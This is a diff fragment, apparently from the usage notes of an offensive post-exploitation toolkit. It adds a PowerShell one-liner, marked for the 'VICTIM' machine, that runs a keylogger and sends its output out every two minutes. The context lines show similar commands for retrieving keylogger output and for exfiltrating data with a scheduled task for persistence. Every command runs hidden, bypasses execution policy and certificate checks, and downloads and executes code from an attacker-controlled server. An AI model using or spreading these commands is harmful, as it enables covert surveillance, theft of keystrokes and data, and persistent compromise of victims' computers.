@@ -27,6 +27,9 @@ VICTIM> powershell -ep bypass -windowstyle hidden -c "[System.Net.ServicePointMa
 #To retrieve keylogger output
 VICTIM> powershell -ep bypass -windowstyle hidden -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString('http://<SERVER-IP>:<SERVER-PORT>/klogger_exf');"
 
+#To run a keylogger and automatically get the output every 2 minutes
+VICTIM> powershell -ep bypass -windowstyle hidden -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString('http://<SERVER-IP>:<SERVER-PORT>/klogger_full');"
+
 #To run data exfiltration + scheduled task (change the command to execute in `config.py`)
 VICTIM> powershell -ep bypass -windowstyle hidden -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString('http://<SERVER-IP>:<SERVER-PORT>/exfpers');"
 
